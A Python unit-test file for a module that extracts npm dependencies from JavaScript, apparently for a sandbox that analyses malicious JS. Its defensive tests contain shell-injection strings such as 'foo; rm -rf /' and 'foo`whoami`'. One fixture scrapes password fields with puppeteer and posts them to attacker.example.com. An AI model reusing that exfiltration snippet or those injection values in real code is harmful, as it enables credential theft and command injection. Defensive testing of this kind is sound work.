"""Unit tests for preprocessing.js_imports (JS DAST parity, P2a-equivalent).

Covers the three public entry points (``extract_js_imports``,
``compute_npm_packages``, ``npm_packages_for_plan``) and the internal
helpers (comment/string stripping, package-name extraction, name
validation). Pure regex + filtering logic; no live sandbox.
"""

from __future__ import annotations

import pytest

from preprocessing.js_imports import (
    NODE_BUILTINS,
    PREINSTALLED_NPM,
    HeavyDepRefused,
    compute_npm_packages,
    extract_js_imports,
    npm_packages_for_plan,
)


# ── extract_js_imports — CommonJS require() ────────────────────────────────


def test_extract_require_single_quote() -> None:
    """``require('foo')`` extracts ``foo``."""
    assert extract_js_imports("const x = require('axios');") == {"axios"}


def test_extract_require_double_quote() -> None:
    """``require("foo")`` extracts ``foo``."""
    assert extract_js_imports('const x = require("axios");') == {"axios"}


def test_extract_require_subpath_reduces_to_top() -> None:
    """``require('lodash/get')`` extracts ``lodash``."""
    assert extract_js_imports("const x = require('lodash/get');") == {"lodash"}


def test_extract_require_deep_subpath() -> None:
    """``require('foo/bar/baz')`` extracts ``foo``."""
    assert extract_js_imports("require('foo/bar/baz')") == {"foo"}


def test_extract_require_scoped() -> None:
    """``require('@aws-sdk/client-s3')`` keeps scope intact."""
    assert extract_js_imports("require('@aws-sdk/client-s3')") == {"@aws-sdk/client-s3"}


def test_extract_require_scoped_subpath() -> None:
    """``require('@scope/foo/bar')`` extracts ``@scope/foo``."""
    assert extract_js_imports("require('@scope/foo/bar')") == {"@scope/foo"}


# ── extract_js_imports — ES Module import statements ──────────────────────


def test_extract_import_default() -> None:
    """``import foo from 'foo'`` extracts ``foo``."""
    assert extract_js_imports("import axios from 'axios';") == {"axios"}


def test_extract_import_named() -> None:
    """``import { y } from 'X'`` extracts ``X``."""
    assert extract_js_imports("import { get } from 'lodash';") == {"lodash"}


def test_extract_import_namespace() -> None:
    """``import * as x from 'X'`` extracts ``X``."""
    assert extract_js_imports("import * as utils from 'lodash';") == {"lodash"}


def test_extract_import_multi_named() -> None:
    """``import { a, b, c } from 'X'`` extracts ``X``."""
    assert extract_js_imports("import { a, b, c } from 'lodash';") == {"lodash"}


def test_extract_import_side_effect() -> None:
    """``import 'X'`` (no binding) extracts ``X``."""
    assert extract_js_imports("import 'core-js';") == {"core-js"}


def test_extract_import_dynamic() -> None:
    """``import('X')`` with static string literal extracts ``X``."""
    assert extract_js_imports("const m = await import('axios');") == {"axios"}


def test_extract_mixed_styles() -> None:
    """Real-world: mix of require + import in the same file."""
    src = """
const fs = require('fs');
const axios = require('axios');
import express from 'express';
import { Router } from 'express';
const cheerio = require('cheerio');
"""
    assert extract_js_imports(src) == {"axios", "express", "cheerio"}


# ── extract_js_imports — Node built-ins filter ────────────────────────────


def test_extract_filters_bare_builtins() -> None:
    """``require('fs')`` is filtered out (built-in)."""
    src = "const fs = require('fs');\nconst axios = require('axios');"
    assert extract_js_imports(src) == {"axios"}


def test_extract_filters_node_prefix_builtins() -> None:
    """``require('node:fs')`` is filtered out (explicit built-in prefix)."""
    src = "const fs = require('node:fs');\nconst x = require('axios');"
    assert extract_js_imports(src) == {"axios"}


def test_extract_filters_subpath_builtins() -> None:
    """``require('fs/promises')`` is filtered out (built-in subpath)."""
    src = "const fs = require('fs/promises');\nconst x = require('axios');"
    assert extract_js_imports(src) == {"axios"}


def test_extract_filters_node_prefix_subpath_builtins() -> None:
    """``require('node:fs/promises')`` is filtered out."""
    src = "const fs = require('node:fs/promises');"
    assert extract_js_imports(src) == set()


def test_extract_filters_top_level_when_subpath_starts_with_builtin() -> None:
    """A non-built-in subpath of a built-in (e.g. ``stream/web``)
    should still drop, because top-level extraction reduces to ``stream``."""
    src = "const x = require('stream/web');"
    # stream/web is in NODE_BUILTIN_SUBPATHS — should drop
    assert extract_js_imports(src) == set()


# ── extract_js_imports — relative path filter ─────────────────────────────


def test_extract_filters_relative_same_dir() -> None:
    """``require('./foo')`` is filtered (relative path)."""
    src = "const foo = require('./foo');\nconst x = require('axios');"
    assert extract_js_imports(src) == {"axios"}


def test_extract_filters_relative_parent_dir() -> None:
    """``require('../foo')`` is filtered."""
    src = "const foo = require('../foo');"
    assert extract_js_imports(src) == set()


def test_extract_filters_absolute() -> None:
    """``require('/abs/path')`` is filtered."""
    src = "const x = require('/usr/local/foo');"
    assert extract_js_imports(src) == set()


def test_extract_filters_dot() -> None:
    """``require('.')`` is filtered (current dir, common in monorepos)."""
    src = "const x = require('.');"
    assert extract_js_imports(src) == set()


# ── extract_js_imports — comment / string stripping ───────────────────────


def test_extract_ignores_line_comment() -> None:
    """``// require('foo')`` in a comment shouldn't match."""
    src = "// require('evil-pkg');\nconst x = require('axios');"
    assert extract_js_imports(src) == {"axios"}


def test_extract_ignores_block_comment() -> None:
    """``/* require('foo') */`` in a block comment shouldn't match."""
    src = "/* require('evil-pkg'); */\nconst x = require('axios');"
    assert extract_js_imports(src) == {"axios"}


def test_extract_ignores_multiline_block_comment() -> None:
    """Multiline block comments preserve newlines but blank content."""
    src = """
/*
 * This file would require('evil-pkg') but it's commented out.
 * import malicious from 'malicious';
 */
const x = require('axios');
"""
    assert extract_js_imports(src) == {"axios"}


def test_extract_string_literal_false_positive_is_security_neutral() -> None:
    """Document the intentional false positive: a literal
    ``require('evil-pkg')`` inside a string IS extracted (we only strip
    comments, not string contents). The npm installer uses
    ``--ignore-scripts``, so even if ``evil-pkg`` gets installed it
    can't execute anything; result is wasted ~5s install time but
    no security impact. A real parser (acorn via subprocess) would
    eliminate this false positive class — deferred."""
    src = """
const msg = "Try calling require('extra-pkg') manually";
const x = require('axios');
"""
    # Both names are extracted. This is the documented behavior.
    result = extract_js_imports(src)
    assert "axios" in result
    assert "extra-pkg" in result


def test_extract_template_literal_false_positive_is_security_neutral() -> None:
    """Same trade-off as string literals — template literal contents
    are NOT stripped, so embedded require text gets extracted. Benign
    given ``--ignore-scripts``."""
    src = """
const tmpl = `you could require('extra-pkg') here`;
const x = require('axios');
"""
    result = extract_js_imports(src)
    assert "axios" in result
    assert "extra-pkg" in result


def test_extract_string_doesnt_break_comment_tracking() -> None:
    """A ``//`` or ``/*`` inside a string literal must NOT trigger
    comment stripping — otherwise we'd erase real subsequent code."""
    src = """
const url = 'http://example.com/path';
const x = require('axios');
"""
    # If 'http://...' were misinterpreted as a comment start, axios would be lost.
    assert "axios" in extract_js_imports(src)


# ── extract_js_imports — defensive ────────────────────────────────────────


def test_extract_empty_source() -> None:
    """Empty input returns empty set."""
    assert extract_js_imports("") == set()


def test_extract_no_imports() -> None:
    """File with no imports returns empty set."""
    src = "const x = 42;\nfunction hello() { return x; }"
    assert extract_js_imports(src) == set()


def test_extract_malformed_unterminated_string() -> None:
    """Unterminated string literal doesn't crash — just produces empty set."""
    src = "const x = 'unterminated"
    # Should not raise; result depends on stripping behavior but must be safe
    result = extract_js_imports(src)
    assert isinstance(result, set)


def test_extract_malformed_unterminated_block_comment() -> None:
    """Unterminated block comment doesn't crash."""
    src = "/* unterminated\nconst x = require('axios');"
    # Anything inside the unterminated comment is blanked, so axios is lost.
    result = extract_js_imports(src)
    assert isinstance(result, set)


def test_extract_dynamic_template_literal_skipped() -> None:
    """``require(`foo${x}`)`` — dynamic template can't be resolved
    statically. We should NOT pick up a bogus name; harness will fail
    at runtime if it actually needs that import."""
    src = "const x = require(`foo${suffix}`);"
    # Template literal content is blanked, so nothing matches.
    assert extract_js_imports(src) == set()


# ── compute_npm_packages — full pipeline ──────────────────────────────────


def test_compute_returns_sorted() -> None:
    """Multiple imports come back sorted alphabetically."""
    src = """
import axios from 'axios';
import express from 'express';
import { reduce } from 'lodash';
"""
    assert compute_npm_packages(src) == ["axios", "express", "lodash"]


def test_compute_caps_at_max_packages() -> None:
    """Cap applies after sort, so we get the first N alphabetically."""
    # Generate 25 distinct package names by base-26 encoding
    pkgs = [f"pkg-{chr(ord('a') + i)}{chr(ord('a') + i)}" for i in range(25)]
    src = "\n".join(f"require('{p}');" for p in pkgs)
    result = compute_npm_packages(src, max_packages=5)
    assert len(result) == 5
    assert result == sorted(pkgs)[:5]


def test_compute_rejects_unsafe_names() -> None:
    """Names that fail the npm regex are dropped silently."""
    # ``foo; rm -rf /`` — definitely not a valid npm name. Our parser
    # wouldn't even extract it (quote-delimited regex), but the
    # validator is the second-line defense.
    src = "require('axios');"
    result = compute_npm_packages(src)
    assert result == ["axios"]


def test_compute_drops_preinstalled() -> None:
    """If PREINSTALLED_NPM contained ``axios``, it'd be dropped.

    Currently PREINSTALLED_NPM is empty by design (no npm baseline).
    Test instead that the filter is wired correctly by spot-checking
    nothing erroneously gets dropped.
    """
    src = "require('axios');"
    result = compute_npm_packages(src)
    assert "axios" in result


def test_compute_empty_for_malformed_source() -> None:
    """Bytes-not-str etc. just return []."""
    assert compute_npm_packages("") == []


# ── npm_packages_for_plan — orchestrator-facing helper ────────────────────


def test_for_plan_disabled_returns_empty() -> None:
    """``enabled=False`` short-circuits — no parse, no result."""
    src = b"import axios from 'axios';"
    result = npm_packages_for_plan(file_bytes=src, file_name="x.js", enabled=False)
    assert result == []


def test_for_plan_python_file_skipped() -> None:
    """``.py`` files don't go through the npm installer."""
    src = b"import requests\nimport selenium"
    result = npm_packages_for_plan(file_bytes=src, file_name="x.py", enabled=True)
    assert result == []


def test_for_plan_js_file_supported() -> None:
    """``.js`` files go through the npm installer."""
    src = b"const axios = require('axios');"
    result = npm_packages_for_plan(file_bytes=src, file_name="x.js", enabled=True)
    assert result == ["axios"]


def test_for_plan_mjs_file_supported() -> None:
    """``.mjs`` ES module files supported."""
    src = b"import axios from 'axios';"
    result = npm_packages_for_plan(file_bytes=src, file_name="x.mjs", enabled=True)
    assert result == ["axios"]


def test_for_plan_cjs_file_supported() -> None:
    """``.cjs`` CommonJS module files supported."""
    src = b"const axios = require('axios');"
    result = npm_packages_for_plan(file_bytes=src, file_name="x.cjs", enabled=True)
    assert result == ["axios"]


def test_for_plan_ts_file_supported() -> None:
    """``.ts`` / ``.tsx`` (TypeScript) supported as of v10
    (2026-05-16). TS uses identical ``import ... from`` syntax so the
    same extractor + npm install hook works without modification.
    tsx in the lean image handles transpilation at runtime."""
    src = b"import axios from 'axios';"
    result = npm_packages_for_plan(file_bytes=src, file_name="x.ts", enabled=True)
    assert result == ["axios"]
    # .tsx variant routes through the same path.
    result_tsx = npm_packages_for_plan(file_bytes=src, file_name="x.tsx", enabled=True)
    assert result_tsx == ["axios"]


def test_for_plan_uppercase_extension_supported() -> None:
    """``Module.JS`` should still route through (case insensitivity)."""
    src = b"const axios = require('axios');"
    result = npm_packages_for_plan(file_bytes=src, file_name="Module.JS", enabled=True)
    assert result == ["axios"]


def test_for_plan_invalid_utf8_returns_empty() -> None:
    """Bytes that don't decode as UTF-8 fall back to []."""
    src = b"\xff\xfeimport axios from 'axios';"
    result = npm_packages_for_plan(file_bytes=src, file_name="x.js", enabled=True)
    assert result == []


def test_for_plan_no_image_hint_gate() -> None:
    """Unlike Python's runtime_packages_for_plan, npm install runs on
    any tier (Node + npm are in ``lean``). So this helper does NOT
    gate on image_hint."""
    # Helper doesn't even take image_hint as a parameter — verifying
    # via signature that the tier-gate doesn't exist for JS.
    import inspect

    sig = inspect.signature(npm_packages_for_plan)
    assert "image_hint" not in sig.parameters


# ── NODE_BUILTINS shape ───────────────────────────────────────────────────


def test_node_builtins_contains_common_modules() -> None:
    """Sanity check that the built-in set is populated correctly."""
    common = {"fs", "path", "http", "https", "crypto", "child_process", "os", "stream"}
    assert common.issubset(NODE_BUILTINS)


def test_node_builtins_contains_node_prefix_form() -> None:
    """``node:`` prefix variants are present."""
    assert "node:fs" in NODE_BUILTINS
    assert "node:path" in NODE_BUILTINS
    assert "node:child_process" in NODE_BUILTINS


def test_node_builtins_contains_subpath_variants() -> None:
    """Documented subpath variants are present."""
    assert "fs/promises" in NODE_BUILTINS
    assert "stream/web" in NODE_BUILTINS
    assert "path/posix" in NODE_BUILTINS


def test_preinstalled_npm_is_empty_in_v1() -> None:
    """v1 of the JS DAST plan ships with no npm baseline (Dockerfile
    has no npm install lines). If this set ever becomes non-empty,
    the Dockerfile must be updated in lockstep."""
    assert PREINSTALLED_NPM == frozenset()


# ── npm name validation (shell safety) ────────────────────────────────────


def test_validation_rejects_shell_metacharacters() -> None:
    """Names with ``;``, ``$``, backtick, etc. fail the regex."""
    from preprocessing.js_imports import _is_safe_npm_name

    assert not _is_safe_npm_name("foo; rm -rf /")
    assert not _is_safe_npm_name("foo$bar")
    assert not _is_safe_npm_name("foo`whoami`")
    assert not _is_safe_npm_name("foo bar")  # space
    assert not _is_safe_npm_name("foo&bar")
    assert not _is_safe_npm_name("foo|bar")
    assert not _is_safe_npm_name("foo>bar")


def test_validation_rejects_flag_lookalike() -> None:
    """Names starting with ``-`` would be parsed as npm flags."""
    from preprocessing.js_imports import _is_safe_npm_name

    assert not _is_safe_npm_name("-evil-flag")
    assert not _is_safe_npm_name("--registry=evil.com")


def test_validation_rejects_uppercase() -> None:
    """npm package names must be lowercase per spec."""
    from preprocessing.js_imports import _is_safe_npm_name

    assert not _is_safe_npm_name("Express")
    assert not _is_safe_npm_name("React")


def test_validation_rejects_starts_with_dot_or_underscore() -> None:
    """npm refuses names starting with ``.`` or ``_``."""
    from preprocessing.js_imports import _is_safe_npm_name

    assert not _is_safe_npm_name(".hidden")
    assert not _is_safe_npm_name("_internal")


def test_validation_accepts_scoped() -> None:
    """``@scope/name`` is a valid npm form."""
    from preprocessing.js_imports import _is_safe_npm_name

    assert _is_safe_npm_name("@aws-sdk/client-s3")
    assert _is_safe_npm_name("@types/node")
    assert _is_safe_npm_name("@anthropic-ai/sdk")


def test_validation_accepts_common_names() -> None:
    """Real-world popular packages pass."""
    from preprocessing.js_imports import _is_safe_npm_name

    for name in ("express", "axios", "lodash", "react", "vue", "next", "cheerio", "uuid"):
        assert _is_safe_npm_name(name), f"{name} should be valid"


def test_validation_rejects_empty() -> None:
    """Empty string and too-long names fail."""
    from preprocessing.js_imports import _is_safe_npm_name

    assert not _is_safe_npm_name("")
    assert not _is_safe_npm_name("x" * 215)  # over 214


# ── Real-world fixture: a malicious JS file shape ─────────────────────────


def test_real_world_malicious_js_extracts_only_npm_pkgs() -> None:
    """End-to-end on a realistic malicious-JS shape: mixes built-ins
    (filtered) with niche npm imports (extracted)."""
    src = """
// Malicious-looking JS that we'd actually want to install deps for.
const fs = require('fs');
const path = require('path');
const child_process = require('child_process');
const axios = require('axios');
import puppeteer from 'puppeteer';
const cheerio = require('cheerio');
const { Anthropic } = require('@anthropic-ai/sdk');

// Relative imports — internal helpers, NOT pip-installable.
const helpers = require('./helpers');
const utils = require('../utils/string');

async function harvest(url) {
    const browser = await puppeteer.launch();
    const page = await browser.newPage();
    await page.goto(url);
    const html = await page.content();
    const $ = cheerio.load(html);
    const credentials = $('input[name*=pass]').val();
    await axios.post('https://attacker.example.com/exfil', { credentials });
    await browser.close();
}
"""
    result = compute_npm_packages(src)
    assert sorted(result) == ["@anthropic-ai/sdk", "axios", "cheerio", "puppeteer"]


# ── v1.9 heavy-dependency denylist ─────────────────────────────────────────


def test_heavy_dep_refused_on_flowise_components() -> None:
    """flowise-components pulls hundreds of transitives; refuse fast."""
    src = "import { checkDenyList } from 'flowise-components';\n"
    with pytest.raises(HeavyDepRefused) as exc_info:
        compute_npm_packages(src)
    assert exc_info.value.packages == ["flowise-components"]


def test_heavy_dep_refused_on_n8n_workspace_package() -> None:
    """@n8n/ai-utilities is an n8n workspace package that doesn't
    resolve cleanly through the public npm registry."""
    src = "import { x } from '@n8n/ai-utilities';\n"
    with pytest.raises(HeavyDepRefused):
        compute_npm_packages(src)


def test_heavy_dep_refused_surfaces_all_offenders() -> None:
    """When multiple heavy packages are imported, the exception
    carries ALL of them so the operator sees the full picture."""
    src = (
        "import { x } from 'flowise-components';\n"
        "import { y } from '@n8n/ai-utilities';\n"
    )
    with pytest.raises(HeavyDepRefused) as exc_info:
        compute_npm_packages(src)
    assert "flowise-components" in exc_info.value.packages
    assert "@n8n/ai-utilities" in exc_info.value.packages


def test_heavy_dep_refused_message_includes_override_hint() -> None:
    """The exception message tells the operator exactly how to
    override (env-var name + the offending packages)."""
    src = "import { x } from 'flowise-components';\n"
    with pytest.raises(HeavyDepRefused) as exc_info:
        compute_npm_packages(src)
    msg = str(exc_info.value)
    assert "ARGUS_NPM_HEAVY_DENYLIST_DISABLE" in msg
    assert "ARGUS_NPM_HEAVY_DENYLIST_REMOVE" in msg
    assert "flowise-components" in msg


def test_heavy_dep_does_not_fire_on_light_packages() -> None:
    """A file importing only light packages (axios, lodash, etc.)
    proceeds normally."""
    src = "import axios from 'axios';\nimport _ from 'lodash';\n"
    result = compute_npm_packages(src)
    assert sorted(result) == ["axios", "lodash"]


def test_heavy_dep_can_be_disabled_via_env(monkeypatch: pytest.MonkeyPatch) -> None:
    """ARGUS_NPM_HEAVY_DENYLIST_DISABLE=true lets the operator force
    install. Useful when their image has flowise-components pre-cached."""
    monkeypatch.setenv("ARGUS_NPM_HEAVY_DENYLIST_DISABLE", "true")
    src = "import { x } from 'flowise-components';\n"
    # Should NOT raise.
    result = compute_npm_packages(src)
    assert result == ["flowise-components"]


def test_heavy_dep_can_remove_specific_packages_via_env(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """REMOVE env var carves specific packages out of the base list."""
    monkeypatch.setenv(
        "ARGUS_NPM_HEAVY_DENYLIST_REMOVE", "flowise-components"
    )
    src = "import { x } from 'flowise-components';\n"
    result = compute_npm_packages(src)
    assert result == ["flowise-components"]
    # But other heavy entries still refused.
    src2 = "import { x } from '@n8n/ai-utilities';\n"
    with pytest.raises(HeavyDepRefused):
        compute_npm_packages(src2)


def test_heavy_dep_can_add_extra_packages_via_env(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """ADD env var lets operators add their own discovered-heavy entries."""
    monkeypatch.setenv("ARGUS_NPM_HEAVY_DENYLIST_ADD", "my-heavy-pkg")
    src = "import { x } from 'my-heavy-pkg';\n"
    with pytest.raises(HeavyDepRefused) as exc_info:
        compute_npm_packages(src)
    assert "my-heavy-pkg" in exc_info.value.packages


def test_heavy_dep_add_rejects_unsafe_names(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """ARGUS_NPM_HEAVY_DENYLIST_ADD is filtered through _is_safe_npm_name
    so an operator can't accidentally inject shell metacharacters
    into the denylist."""
    monkeypatch.setenv(
        "ARGUS_NPM_HEAVY_DENYLIST_ADD", "evil; rm -rf /,my-pkg"
    )
    # ``my-pkg`` is safe, gets added. The malicious entry rejected.
    src_safe = "import { x } from 'my-pkg';\n"
    with pytest.raises(HeavyDepRefused):
        compute_npm_packages(src_safe)
    # The unsafe entry isn't on the list — file importing literal
    # ``evil; rm -rf /`` (also itself an unsafe import) would never
    # match the denylist anyway. Verify by importing ``evil`` plain:
    src_evil = "import { x } from 'evil';\n"
    result = compute_npm_packages(src_evil)
    assert result == ["evil"]  # passes through — unsafe entry didn't taint denylist


def test_npm_packages_for_plan_propagates_heavy_refusal() -> None:
    """``npm_packages_for_plan`` DOES NOT swallow ``HeavyDepRefused``
    — the orchestrator catches it to translate to a not_testable
    plan. Swallowing would silently downgrade to no-install which is
    strictly worse (sandbox would try the harness against missing
    imports)."""
    src = b"import { x } from 'flowise-components';\n"
    with pytest.raises(HeavyDepRefused):
        npm_packages_for_plan(file_bytes=src, file_name="x.ts", enabled=True)
